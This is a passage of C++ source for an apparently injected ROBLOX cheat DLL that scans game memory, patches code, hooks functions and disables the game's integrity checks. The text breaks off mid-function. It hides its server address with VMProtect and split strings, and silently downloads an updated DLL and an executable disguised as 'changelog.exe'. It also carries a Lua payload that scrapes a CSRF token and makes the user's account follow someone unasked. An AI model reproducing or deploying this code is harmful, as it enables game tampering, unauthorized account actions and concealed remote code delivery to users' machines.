// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <fstream>
#include <istream>
#include <iterator>
#include <numeric>
#include <algorithm>
#include <string>
#include <cstring>
#include <Psapi.h>
#include <conio.h>
#include <atlstr.h>
#include <typeinfo>
#include <tlhelp32.h>
//#include "XYZ_DB.h"
#include "MainLua.h"
#include "MainForm.h"
#include "UI.h"
#include "Checks.h"
#include "form.h"
//#include "Memcheck.h" // removed since the new Checks.cpp
//#include "detours.h" // removed since the new Checks.cpp
////////////////////////
//#include "form.h"
#include <io.h>
#include <fcntl.h>
////////////////////////
#include "VMProtectSDK.h"
/////////////////////////
#include "Helper.h"
/////////////////////////
#include <intrin.h>
#include <tchar.h>
#include <urlmon.h>
#include "DoCommand.h"

#pragma warning(disable:4996)

#define ACMERR 0xFF5

#pragma comment (lib, "Wininet.lib")
#pragma comment (lib, "urlmon.lib")
//#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "detours.lib")

HW_PROFILE_INFO hwProfileInfo;

int SecurityCheck = 0;



void RescanADDR();
void OutdatedCheck();
void MemcheckStart();
BOOL IsFiddlerPresent();
std::string GetFilePath();
std::string GetProductId();
std::string GetHardwareId();
std::string AuthenticateUser(int uid, std::string authTicket, std::string auth_hash);
int DisableChecks();
int CalledExit = 0;

extern void DoCommand(const std::string& cmd);
extern void TeleportedToAnotherGame();
extern void noreturn();

#define ScriptContextVftableAddress			rbxaddy(0x1189C20)
//#define OpenStateAddress					rbxaddy(0x53BD30)
#define RetcheckAddress						rbxaddy(0x1189C20)

typedef void(__thiscall *servers)();
typedef void(__cdecl *check)(); // http://i.imgur.com/UGELKXo.png
check retcheck = (check)Retcheck_;//0x544E80);//0x544140);//0x541430);//0x542020);//0x53FF40);//0x53A8F0);//0x53AA20);//0x53AA70);//0x537ED0);//0x538700);//0x538580;//0x537DE0;//0x51ABA0;//0x51B360;//0x51C9C0;//0x51FEE0;//0x543A70;//0x566E60;//0x56A0B0;//0x56A100;//0x5436C0;//0x53F0E0;
check wotcake = (check)rbxaddy(0x000000);
servers memcheck = (servers)rbxaddy(0x198E4C1);
std::string ot8yetfjehffj = VMProtectDecryptStringA("Get");
std::string fja9teagjgodzak = VMProtectDecryptStringA("et");
std::string endl = VMProtectDecryptStringA("\n");

//extern int UImain();

void noreturn() {
	return;
}

DWORD PatchedGetTop(int state) { // straight out of GetTop
	if (luaState == 0) {
		luaState = state;
	}
	return (*(DWORD *)(state + 16) - *(DWORD *)(state + 28)) >> 4;
}

namespace Memory {
	bool Compare(const BYTE *pData, const BYTE *bMask, const char *szMask) {
		for (; *szMask; ++szMask, ++pData, ++bMask)
			if (*szMask == 'x' && *pData != *bMask) return 0;
		return (*szMask) == NULL;
	}

	DWORD FindPattern(DWORD dwAddress, DWORD dwLen, BYTE *bMask, const char *szMask) {
		for (int i = 0; i<(int)dwLen; i++)
			if (Compare((BYTE*)(dwAddress + (int)i), bMask, szMask))  return (int)(dwAddress + i);
		return 0;
	}

	int Scan(DWORD mode, const char* content, const char* mask) {
		VMProtectBeginMutation("khsfaoifhryh24h8"); // Hot scan function
		DWORD PageSize;
		SYSTEM_INFO si;
		GetSystemInfo(&si);
		PageSize = si.dwPageSize;
		MEMORY_BASIC_INFORMATION mi;
		for (DWORD lpAddr = 0; lpAddr < 0x7FFFFFFE; lpAddr += PageSize) {
			DWORD vq = VirtualQuery((void*)lpAddr, &mi, PageSize);
			if (vq == ERROR_INVALID_PARAMETER || vq == 0) break;
			if (mi.Type == MEM_MAPPED) continue;
			if (mi.Protect == mode) {
				int addr = FindPattern(lpAddr, PageSize, (PBYTE)content, mask);
				if (addr != 0) {
					VMProtectEnd();
					return addr;
				}
			}
		}
		return 0;
	}

	int BackupScan(DWORD mode, char* content, char* mask) {
		HANDLE CurrentThread = GetCurrentThread();
		int StartPriority = GetThreadPriority(CurrentThread);
		SetThreadPriority(CurrentThread, THREAD_PRIORITY_TIME_CRITICAL);

		DWORD PageSize;
		SYSTEM_INFO si;
		GetSystemInfo(&si);
		PageSize = si.dwPageSize;
		MEMORY_BASIC_INFORMATION mi;
		//Modules::GetBaseInst()->SetThreadActive(false);
		for (DWORD lpAddr = 0; lpAddr < 0x7FFFFFFE; lpAddr += PageSize) {
			DWORD vq = VirtualQuery((void*)lpAddr, &mi, PageSize);
			if (vq == ERROR_INVALID_PARAMETER || vq == 0) break;
			if (mi.Type == MEM_MAPPED) continue;
			if (mi.State == MEM_COMMIT && mi.Protect == PAGE_READWRITE || mi.Protect == PAGE_READONLY || mi.Protect == PAGE_EXECUTE_READWRITE && mi.Protect != PAGE_NOACCESS) {
				int addr = FindPattern(lpAddr, PageSize, (PBYTE)content, mask);
				if (addr != 0) {
					SetThreadPriority(CurrentThread, StartPriority);
					//Modules::GetBaseInst()->SetThreadActive(true);
					return addr;
				}
			}
		}
		SetThreadPriority(CurrentThread, StartPriority);
		//Modules::GetBaseInst()->SetThreadActive(true);
		return 0;
	}

	void Suspend() {
		DWORD processId = GetCurrentProcessId();
		HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		THREADENTRY32 threadEntry;
		threadEntry.dwSize = sizeof(THREADENTRY32);
		Thread32First(hThreadSnapshot, &threadEntry);
		do {
			if (threadEntry.th32OwnerProcessID == processId) {
				DWORD CurrentThreadID = GetCurrentThreadId();
				if (threadEntry.th32ThreadID != CurrentThreadID) {
					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,
						threadEntry.th32ThreadID);
					SuspendThread(hThread);
					CloseHandle(hThread);
				}
			}
		} while (Thread32Next(hThreadSnapshot, &threadEntry));
		CloseHandle(hThreadSnapshot);
	}

	void Resume() {
		DWORD processId = GetCurrentProcessId();
		HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		THREADENTRY32 threadEntry;
		threadEntry.dwSize = sizeof(THREADENTRY32);
		Thread32First(hThreadSnapshot, &threadEntry);
		do {
			if (threadEntry.th32OwnerProcessID == processId) {
				DWORD CurrentThreadID = GetCurrentThreadId();
				if (threadEntry.th32ThreadID != CurrentThreadID) {
					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,
						threadEntry.th32ThreadID);
					ResumeThread(hThread);
					CloseHandle(hThread);
				}
			}
		} while (Thread32Next(hThreadSnapshot, &threadEntry));
		CloseHandle(hThreadSnapshot);
	}
}

void CreateConsole() {
	if (DoesConsoleExist())
		return;

	int hConHandle = 0;
	HANDLE lStdHandle = 0;
	FILE *fp = 0;

	AllocConsole();

	lStdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	hConHandle = _open_osfhandle(PtrToUlong(lStdHandle), _O_TEXT);
	fp = _fdopen(hConHandle, "w");
	*stdout = *fp;
	setvbuf(stdout, NULL, _IONBF, 0);

	lStdHandle = GetStdHandle(STD_INPUT_HANDLE);
	hConHandle = _open_osfhandle(PtrToUlong(lStdHandle), _O_TEXT);
	fp = _fdopen(hConHandle, "r");
	*stdin = *fp;
	setvbuf(stdin, NULL, _IONBF, 0);

	lStdHandle = GetStdHandle(STD_ERROR_HANDLE);
	hConHandle = _open_osfhandle(PtrToUlong(lStdHandle), _O_TEXT);
	fp = _fdopen(hConHandle, "w");
	*stderr = *fp;
	setvbuf(stderr, NULL, _IONBF, 0);
	std::string Template = std::string("XYZv") + XYZ_VERSION + std::string(" | by 1337IsBack & Variable | ThreadId: 1011");
	SetConsoleTitle(Template.c_str());
}

void doState() {
	if (CalledExit == 0) {
		if (Changing == true) {
			int LocalCharacter = GetCharacterFromPlayer(LocalPlayer);
			if (LocalCharacter != 0) {
				int Humanoid = FindFirstClass(LocalCharacter, "Humanoid");
				int HumanoidRootPart = FindFirstChild_PartOf(LocalCharacter, "HumanoidRootPart");
				if (Humanoid != 0 && HumanoidRootPart != 0) {
					int Weld = FindFirstClass(HumanoidRootPart, "Motor6D");
					if (Weld != 0) {
						SetLocalHumanoidState(State);
					}
				}
			}
		}
	}
}

void Loop() {
	while (true) {//do { // for local commands
		if (XYZ_State == nullptr) {
			XYZ_State = luaL_newstate();

			Engine::Events::Event::RegisterEvents(XYZ_State);
			Engine::Events::EventConnection::Setup(XYZ_State);

			luaL_openlibs(XYZ_State);
			SetupLuaState(XYZ_State);
		}
		Evt->Fire([](lua_State* L, std::vector<const void*> Info)->int { return 0; }, {});
		if (CalledExit == 0) {
			Sleep(10); //45
			if (CalledExit == 0) {
				int s = FindFirstClass(DataModel, "Workspace");
				if (s != 0) {
					if (Changing == true) {
						//*(DWORD*)0x1693B18 = 7; // ScriptSecurity

						doState();
						//std::thread run(&doState);//Command->Func, vec);
						//run.detach();

						//doState(); Sleep(4);

						/* search for "Current identity is"
						take the first result
						now ull find the string in a function which has this part
						"Current identity is %d", *v6)
						now just see what v6 comes from
						where v6 comes from is the function that u need
						follow it, and it should be the second dword that looks like this:
						{
						dword_169898C |= 1u;
						dword_1698988 = 0; // this is it!!
						}
						*/
					}
				}
				else {
					ConsoleOutput("\n --> Teleported to another game!\n"); Sleep(2500);
					TeleportedToAnotherGame();
				}
			}
			else {
				break;
			}
		}
		else {
			break;
		}
	}
}

std::string Input() {
	std::string inputData;
	getline(std::cin, inputData);
	return inputData;
}

//HINTERNET hSession, hConnect, hRequest;

//char hdrs[] = ("Content-Type:application/x-www-form-urlencoded\r\n");
//char frmdata[] = ("chk=omghackerslol&u=1747443");
std::string tfaliaafas3ghhofhaot9f9awjf3 = std::string("ed") + std::string("uf") + std::string("ee") + std::string("dba") + std::string("ck.") + std::string("or") + std::string("g");

void Post_Data(std::string strdata) {
	VMProtectBeginMutation("mdjjs9akslzp");
	TCHAR hdrs[] = TEXT("Content-Type: application/x-www-form-urlencoded");
	char* data = strcpy((char*)malloc(strdata.length() + 1), strdata.c_str());

	HINTERNET lhSession = InternetOpen(VMProtectDecryptStringA("XYZ"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	if (lhSession) {
		HINTERNET hConnect = InternetConnect(lhSession, VMProtectDecryptStringA(tfaliaafas3ghhofhaot9f9awjf3.c_str()), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
		std::string ajfawjgjagokgsghhh = std::string("/") + std::string("a") + std::string("u") + std::string("t") + std::string("h") + std::string(".") + std::string("p") + std::string("h") + std::string("p");
		std::string a9t0ajfgojawpjfzsoja0 = std::string("P") + std::string("O") + std::string("S") + std::string("T");
		HINTERNET hRequest = HttpOpenRequest(hConnect, VMProtectDecryptStringA(a9t0ajfgojawpjfzsoja0.c_str()), VMProtectDecryptStringA(ajfawjgjagokgsghhh.c_str()), NULL, NULL, NULL, 0, 1);

		bool check;
		check = HttpSendRequest(hRequest, hdrs, strlen(hdrs), data, strlen(data));

		InternetCloseHandle(hConnect);
		InternetCloseHandle(hRequest);
	}
	InternetCloseHandle(lhSession);
	VMProtectEnd();
}

std::string DownloadURL(const char* URL) { // Default_User_Agent // Mozilla/5.0 // XYZ
	VMProtectBeginMutation("fkfi38sjahdz");
	std::string UserAgent = VMProtectDecryptStringA("XYZ");//") + XYZ_VERSION; // INTERNET_OPEN_TYPE_DIRECT // INTERNET_OPEN_TYPE_PRECONFIG
	HINTERNET interwebs = InternetOpen(UserAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);//INTERNET_FLAG_ASYNC);//NULL);
	HINTERNET urlFile;
	std::string rtn = "";
	if (interwebs) {
		urlFile = InternetOpenUrl(interwebs, URL, NULL, NULL, INTERNET_FLAG_PRAGMA_NOCACHE, NULL);// NULL, NULL); // INTERNET_FLAG_PRAGMA_NOCACHE, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
		}
	}
	InternetCloseHandle(interwebs);
	VMProtectEnd();
	return rtn;
}

void Crash() {
	VMProtectBeginMutation("joaojf0qlfgaz");
	TerminateProcess(GetCurrentProcess(), 0);
	exit(-1);
	VMProtectEnd();
	Crash();
}

void _nop(int address, int bytes) {
	VMProtectBeginMutation("lfp29ao19idz");
	DWORD A, B;
	VirtualProtect((LPVOID)address, bytes, PAGE_EXECUTE_READWRITE, &A);
	for (int x = 0; x != bytes; x++) {
		__try {
			*(BYTE*)(address + x) = 0x90;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
	}
	VirtualProtect((LPVOID)address, bytes, A, &B);
	VMProtectEnd();
}

typedef DWORD(__thiscall *pOpenState)(void* self, int i);
typedef int(__thiscall *pOpenState_)(int self);
pOpenState_ rbxlua_openstate = (pOpenState_)rbxaddy(0x6AE1F0);
DWORD OpenState() {
	VMProtectBeginMutation("kdj289aksnxh");
	if (ScriptContext != 0) {
		if (MemChkRan == TRUE) {
			int TempLuaState = ((pOpenState)(SigScan("\x55\x8B\xEC\x56\x57\x6A\x05", "xxxxxxx")))((void*)ScriptContext, 6); //globalStates[vm_index].state
			if (TempLuaState != 0) {
				luaState = rbxlua_newthread(TempLuaState);
				CluaState = rbxlua_newthread(TempLuaState);
				TeleportState = rbxlua_newthread(TempLuaState);
				LocalState = rbxlua_newthread(TempLuaState);
				DeleteState = rbxlua_newthread(TempLuaState);
				rbxlua_State = rbxlua_newthread(TempLuaState);
			}
			else {
				Sleep(1200);
				TempLuaState = ((pOpenState)(SigScan("\x55\x8B\xEC\x56\x57\x6A\x05", "xxxxxxx")))((void*)ScriptContext, 6);
				if (TempLuaState != 0) {
					luaState = rbxlua_newthread(TempLuaState);
					CluaState = rbxlua_newthread(TempLuaState);
					TeleportState = rbxlua_newthread(TempLuaState);
					LocalState = rbxlua_newthread(TempLuaState);
					DeleteState = rbxlua_newthread(TempLuaState);
					rbxlua_State = rbxlua_newthread(TempLuaState);
				}
			}
		}
		else {
			int TempLuaState = ((pOpenState)(SigScan("\x55\x8B\xEC\x56\x57\x6A\x05", "xxxxxxx")))((void*)ScriptContext, 6);
			if (TempLuaState != 0) {
				luaState = TempLuaState;
				CluaState = TempLuaState;
				TeleportState = TempLuaState;
				LocalState = TempLuaState;
				DeleteState = TempLuaState;
				rbxlua_State = TempLuaState;
			}

		}
		VMProtectEnd();
		return DWORD(1);
	}
	return DWORD(0);
}

void RescanADDR() {
	ScriptContextVftable = ScriptContextVftableAddress;
	ScriptContext = Memory::BackupScan(PAGE_READWRITE, (char*)&ScriptContextVftable, "xxxx");
	if (ScriptContext == 0) {
		do {
			Sleep(500);
			if (ScriptContext == 0) {
				ScriptContext = Memory::BackupScan(PAGE_READWRITE, (char*)&ScriptContextVftable, "xxxx");
			}
			else {
				break;
			}
		} while (true);
	}
}

void RescanAlternative() {
	Sleep(500);
	while (ScriptContext == 0) {
		ScriptContextVftable = ScriptContextVftableAddress;
		ScriptContext = Memory::BackupScan(PAGE_READWRITE, (char*)&ScriptContextVftable, "xxxx");
		if (ScriptContext == 0) {
			Sleep(3500);
		}
	}
}

int RetrieveDataModel() {
	int TempWorkspace;
	ScriptContextVftable = ScriptContextVftableAddress;
	while (ScriptContext == 0 || DataModel == 0 || TempWorkspace == 0) {
		Sleep(4000);
		ScriptContext = Memory::BackupScan(PAGE_READWRITE, (char*)&ScriptContextVftable, "xxxx");
		DataModel = GetParent(ScriptContext);
		if (DataModel != 0) {
			TempWorkspace = FindFirstChild(DataModel, "Workspace");
			if (TempWorkspace != 0) {
				ConsoleOutput("true");
				return DataModel;
			}
		}
	}
	ConsoleOutput("false");
	return 0;
}

//--------------------------------------------------------------------------------

void WaitForRoblox() {
	bool Open = false; Sleep(250);
	while (FindWindowA(NULL, "ROBLOX") == NULL || Open != false) {
		HWND Window = FindWindowA(NULL, "ROBLOX");
		if (IsWindowVisible(Window)) {
			Open = true;
			//break;
		}
		Sleep(250);
	}
}

std::string random_string(size_t length) { // chk
	VMProtectBeginMutation("8f8gy9aogghaisg");
	srand(time_t(NULL));
	auto randchar = []() -> char {
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	VMProtectEnd();
	return str;
}

std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
	}
	return str;
}

bool CheckForUpdates() {
	VMProtectBeginMutation("135jaf1itakt1mg");
	std::string aopr3pajfvpgtau30ta = std::string("ht") + std::string("tp") + std::string(":") + std::string("//") + std::string("ed") + std::string("uf") + std::string("ee") + std::string("dba") + std::string("ck.") + std::string("or") + std::string("g/");
	std::string fiah98wfhh8fweaja = aopr3pajfvpgtau30ta + std::string("v") + std::string("er") + std::string("si") + std::string("on.") + std::string("t") + std::string("xt");
	std::string ReturnedVersion = DownloadURL(VMProtectDecryptStringA(fiah98wfhh8fweaja.c_str()));//GetHttpXYZ("/version.txt");
	std::string returnV = ReturnedVersion;

	std::size_t LatestVersion = returnV.find(XYZ_VERSION);
	std::size_t OldVersion = returnV.find(OLD_XYZ_VERSION);

	try { remove("trash.txt"); }
	catch (std::exception) {}
	catch (...) {}

	if (LatestVersion != std::string::npos || OldVersion != std::string::npos) {}
	else {
		std::string FilePath = GetFilePath();
		std::string Directory;
		if (FilePath.find_last_of('\\') != std::string::npos) {
			Directory = FilePath.substr(0, FilePath.find_last_of('\\'));
		}
		std::string newDirectory1 = Directory + std::string("\\XYZv.vmp.dll");
		std::string newDirectory2 = Directory + std::string("\\changelog.txt");
		CreateConsoleAlternative();
		ConsoleOutput("A new version of XYZ is now being installed...");

		//Update DLL
		if (MoveFileEx(newDirectory1.c_str(), std::string(Directory + "\\trash.dll").c_str(), MOVEFILE_REPLACE_EXISTING) == 0) {
			//return false;
		}

		if (MoveFileEx(newDirectory2.c_str(), std::string(Directory + "\\trash.txt").c_str(), MOVEFILE_REPLACE_EXISTING) == 0) {
			//return false;
		}
		
		std::string up1 = aopr3pajfvpgtau30ta + std::string("XYZv.vmp.dll");

		HRESULT XTZ = URLDownloadToFile(NULL, _T(up1.c_str()), _T(std::string(newDirectory1).c_str()), 0, NULL);
		if (SUCCEEDED(XTZ)) {
			ConsoleOutput("\n\nXYZ has successfully updated!\n\nROBLOX will close out in 15 seconds...\n"); Sleep(1000);
		}
		else {
			ConsoleOutput("\n\nXYZ has been removed from the host temporarily for maintenance and cannot be used until then.\n\nROBLOX will close out in 15 seconds..."); Sleep(15000);
			ExitGameAndXYZ();
		}

		std::string up2 = aopr3pajfvpgtau30ta + "changelog.";
		up2 = up2 + std::string("e");
		up2 = up2 + std::string("x");
		up2 = up2 + std::string("e");

		try { remove("trash.txt"); }
		catch (std::exception) {}
		catch (...) {}

		HRESULT changelog = URLDownloadToFile(NULL, _T(up2.c_str()), _T(std::string(newDirectory2).c_str()), 0, NULL);
		VMProtectEnd();
		return true;
	}
	SecurityCheck = 1;
	return false;
}

int __fastcall PatchedChat(void* players, void* dummyData, std::string* message) {
	if (Authenticated == true) {
		const std::string fixedmsg = *message;
		if (fixedmsg.substr(0, 1) == std::string(prefix)) {
			HandleCommand(fixedmsg.substr(1));
		}
		else if (fixedmsg.substr(0, 4) == std::string("/e ") + std::string(prefix)) {
			HandleCommand(fixedmsg.substr(4));
		}
		else if (fixedmsg.substr(0, 4) == std::string("/w ") + std::string(prefix)) {
			HandleCommand(fixedmsg.substr(4));
		}
	}
	return 1;
}

__int16 __fastcall PatchedSpeed(void* humanoid, void* dummyData, float speed) {
	return 16;
}

int __stdcall PatchedCrash(int a1, char a2) {
	MessageBoxA(0, "ROBLOX ran into a unknown error, but XYZ has stopped it from crashing"
		"\r\nEven thought XYZ stopped ROBLOX from crashing ROBLOX has a higher chance of freezing.", "XYZ Notice", 0);
	while (true) {
		Sleep(1000);
	}
	return 1;
}

DWORD HookCheck = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll") + 5 + 5, "HookCheck");

#define RetcheckSize			39
void MemcheckStart() {
	VMProtectBeginMutation("lk83jjgadj20x");
	if (Bypass == 1) { // turns off for everyone if 1337
		MemcheckStatus = TRUE;
		if (MemcheckStatus == TRUE) {
//			Memcheck_Disable();
	

			
			MemChkRan = TRUE;
		}
	}
	else {
		MemcheckStatus = FALSE;
		MemChkRan = FALSE;
	}
	VMProtectEnd();
}

void TeleportedToAnotherGame() {
	VMProtectBeginMutation("ls93jhd72hsanz4");
	if (CalledExit == 0) {
		Changing = false;
		RescanAlternative(); Bypass = 1;
		DataModel = GetParent(ScriptContext);
		if (DataModel <= 0) {
			RescanAlternative();//RescanADDR();//
			DataModel = GetParent(ScriptContext);
		}
		if (SecurityCheck != 1 && MemChkRan != FALSE) { // should stop people from JMPing to addresses
			Crash();
		}
		Workspace = FindFirstClass(DataModel, "Workspace");
		Lighting = FindFirstClass(DataModel, "Lighting");
		ReplicatedStorage = Lighting;//FindFirstChild_PartOf(DataModel, VMProtectDecryptStringA("Lighting"));
		Players = FindFirstClass(DataModel, "Players");
		//Teams = FindFirstClass(DataModel, "Teams");
		LocalPlayer = GetLocalPlayer(Players);

		const char* Message = " - A unknown error has occured!\n\n";
		if (Workspace != 0) {
			BYTE nnn = FilteringEnabledCheck(Workspace);
			if (nnn == 1) {
				Message = "Filtering is ENABLED! Most commands will not work properly!\n\n";
			}
			else if (nnn == 0) {
				Message = "Filtering is disabled :)!\n\n";
			}
		}
		ConsoleOutput((std::string)Message);
		int OpenStateActive = OpenState();
	}
	VMProtectEnd();
}

bool CHECK() {
	char WindowText[256];
	HWND hwnd;
	hwnd = GetForegroundWindow();
	GetWindowText(hwnd, WindowText, 256);

	if (strstr(WindowText, "ROBLOX") && !strstr(WindowText, "ROBLOX Studio")) {
		return true;
	}
	return false;
}

bool CheckForMali() {
	VMProtectBeginMutation("mu38sqhsak01p");
	char WindowText[256];
	HWND hwnd;
	hwnd = GetForegroundWindow();
	GetWindowText(hwnd, WindowText, 256);

	if (strstr(WindowText, "Cv3") || strstr(WindowText, "Memory") || strstr(WindowText, "Cashed") || strstr(WindowText, "Stromae") || strstr(WindowText, "Cheat")) {
		VMProtectEnd();
		return true;
	}
	return false;
}

void kekRun() {
	VMProtectBeginMutation("poakfpk3jfasfw1");
	const char* Oml = VMProtectDecryptStringA("local getRVT = game:HttpGet('http://m.roblox.com/home', true);local rvt = getRVT:match('<input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"(. - )\">'):match('(.-)\" / >');game:HttpPost('http://m.roblox.com/Followships/Follow', '__RequestVerificationToken=' .. rvt .. '&userId='..tostring(guyToFollow)..'&status=true', true, 'application/x-www-form-urlencoded; charset=UTF-8')");
	RunLua(std::string(Oml));
	VMProtectEnd();
}

bool mouseset = false;
void SetupMouse(int state) {
	if (mouseset != true) {
		rbxlua_getservice(state, "Players");
		if (!rbxlua_isnil(state, -1)) {
			rbxlua_getfield(state, -1, "LocalPlayer");
			if (!rbxlua_isnil(state, -1)) {
				rbxlua_getfield(state, -1, "GetMouse");
				if (rbxlua_isfunction(state, -1)) {
					rbxlua_pushvalue(state, -2);
					rbxlua_pcall(state, 1, 1, 0);
					rbxlua_setglobal(state, "LocalMouse");
					mouseset = true;
				}
				else {
					clearStack(state);
				}
			}
			else {
				clearStack(state);
			}
		}
		else {
			clearStack(state);
		}
	}
}

void ClickToDoStuff() {
	VMProtectBeginMutation("2uraykanl05125f");
	BOOL debounce = FALSE;
	while (TRUE) {
		if (CalledExit == 0) {
			if (CheckForMali() != false) return Crash();
			if (debounce == FALSE) {
				bool CTRL_DOWN = GetAsyncKeyState(VK_CONTROL) & 0x8000;
				bool CLICK_DOWN = GetAsyncKeyState(VK_LBUTTON) & 0x8000;
				/*bool RIGHT_CLICK = GetAsyncKeyState(VK_RBUTTON) & 0x8000;
				if (RIGHT_CLICK) {
					char WindowText[256];
					HWND hwnds;
					hwnds = GetForegroundWindow();
					GetWindowText(hwnds, WindowText, 256);


					if (strstr(WindowText, "ROBLOX") && !strstr(WindowText, "ROBLOX Studio")) {
						ConsoleOutput("\r\nRight clicked!");
						HMENU xhxPopupMenu = CreatePopupMenu();
						InsertMenu(xhxPopupMenu, 0, MF_BYPOSITION | MF_STRING, EXITGAME, _T("Exit"));
						InsertMenu(xhxPopupMenu, 0, MF_BYPOSITION | MF_STRING, EXITGAME, _T("Play"));
						SetForegroundWindow(okaaa);
						//int xxPos = GET_X_LPARAM(lParam);
						//int yyPos = GET_Y_LPARAM(lParam);
						TrackPopupMenu(xhxPopupMenu, TPM_BOTTOMALIGN | TPM_LEFTALIGN, 0, 0, 0, okaaa, NULL);
					}
					Sleep(250);
				}*/
				if (CTRL_DOWN && CLICK_DOWN) {
					if (CHECK() == true && debounce == FALSE) {
						SetupMouse(TeleportState);
						if (TeleportOnClick == true) {
							debounce = TRUE;
							rbxlua_getglobal(TeleportState, "LocalMouse");
							if (!rbxlua_isnil(TeleportState, -1)) {
								rbxlua_getfield(TeleportState, -1, "Hit"); // CFRAME
								if (!rbxlua_isnil(TeleportState, -1)) {
									rbxlua_getservice(TeleportState, "Players");
									if (!rbxlua_isnil(TeleportState, -1)) {
										rbxlua_getfield(TeleportState, -1, "LocalPlayer");
										if (!rbxlua_isnil(TeleportState, -1)) {
											rbxlua_getfield(TeleportState, -1, "Character");
											if (!rbxlua_isnil(TeleportState, -1)) {
												rbxlua_getfield(TeleportState, -1, "HumanoidRootPart");
												if (!rbxlua_isnil(TeleportState, -1)) {
													rbxlua_pushvalue(TeleportState, -5);
													rbxlua_setfield(TeleportState, -2, "CFrame"); Sleep(50);
												}
												else {
													clearStack(TeleportState);
												}
											}
											else {
												clearStack(TeleportState);
											}
										}
										else {
											clearStack(TeleportState);
										}
									}
									else {
										clearStack(TeleportState);
									}
								}
								else {
									clearStack(TeleportState);
								}
							}
							else {
								clearStack(TeleportState);
							}
							Sleep(750);
						}
						else if (DeleteOnClick == true) {
							debounce = TRUE;
							rbxlua_getglobal(DeleteState, "LocalMouse");
							if (!rbxlua_isnil(DeleteState, -1)) {
								rbxlua_getfield(DeleteState, -1, "Target"); // OBJECT
								if (!rbxlua_isnil(DeleteState, -1)) {
									rbxlua_getfield(DeleteState, -1, "Destroy");
									if (rbxlua_isfunction(DeleteState, -1)) {
										rbxlua_pushvalue(DeleteState, -2);
										rbxlua_pcall(DeleteState, 1, 0, 0); Sleep(50);
									}
									else {
										clearStack(DeleteState);
									}
								}
								else {
									clearStack(DeleteState);
								}
							}
							else {
								clearStack(DeleteState);
							}
							Sleep(400);
						}
						else if (AnchorOnClick == true) {
							debounce = TRUE;
							rbxlua_getglobal(DeleteState, "LocalMouse");
							if (!rbxlua_isnil(DeleteState, -1)) {
								rbxlua_getfield(DeleteState, -1, "Target"); // OBJECT
								if (!rbxlua_isnil(DeleteState, -1)) {
									rbxlua_getfield(DeleteState, -1, "Anchored");
									if (rbxlua_isboolean(DeleteState, -1)) {
										BOOL a = rbxlua_toboolean(DeleteState, -1);
										if (a == TRUE) {
											a = FALSE;
										}
										else {
											a = TRUE;
										}
										rbxlua_pushbool(DeleteState, a);
										rbxlua_setfield(DeleteState, -3, "Anchored");
									}
									else {
										clearStack(DeleteState);
									}
								}
								else {
									clearStack(DeleteState);
								}
							}
							else {
								clearStack(DeleteState);
							}
							Sleep(400);
						}
						else if (CanCollideOnClick == true) {
							debounce = TRUE;
							rbxlua_getglobal(DeleteState, "LocalMouse");
							if (!rbxlua_isnil(DeleteState, -1)) {
								rbxlua_getfield(DeleteState, -1, "Target"); // OBJECT
								if (!rbxlua_isnil(DeleteState, -1)) {
									rbxlua_getfield(DeleteState, -1, "CanCollide");
									if (rbxlua_isboolean(DeleteState, -1)) {
										BOOL a = rbxlua_toboolean(DeleteState, -1);
										if (a == TRUE) {
											a = FALSE;
										}
										else {
											a = TRUE;
										}
										rbxlua_pushbool(DeleteState, a);
										rbxlua_setfield(DeleteState, -3, "CanCollide");
									}
									else {
										clearStack(DeleteState);
									}
								}
								else {
									clearStack(DeleteState);
								}
							}
							else {
								clearStack(DeleteState);
							}
							Sleep(400);
						}
						else if (LockedOnClick == true) {
							debounce = TRUE;
							rbxlua_getglobal(DeleteState, "LocalMouse");
							if (!rbxlua_isnil(DeleteState, -1)) {
								rbxlua_getfield(DeleteState, -1, "Target"); // OBJECT
								if (!rbxlua_isnil(DeleteState, -1)) {
									rbxlua_getfield(DeleteState, -1, "Locked");
									if (rbxlua_isboolean(DeleteState, -1)) {
										BOOL a = rbxlua_toboolean(DeleteState, -1);
										if (a == TRUE) {
											a = FALSE;
										}
										else {
											a = TRUE;
										}
										rbxlua_pushbool(DeleteState, a);
										rbxlua_setfield(DeleteState, -3, "Locked");
									}
									else {
										clearStack(DeleteState);
									}
								}
								else {
									clearStack(DeleteState);
								}
							}
							else {
								clearStack(DeleteState);
							}
							Sleep(400);
						}
					}
				}
			}
			debounce = FALSE;
			Sleep(15);
		}
		else {
			break;
		}
	}
	VMProtectEnd();
}

void CommandsInterfaceInit()
{
	HANDLE hPipe;
	char buffer[1024];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\QTXExecutionCmd"),
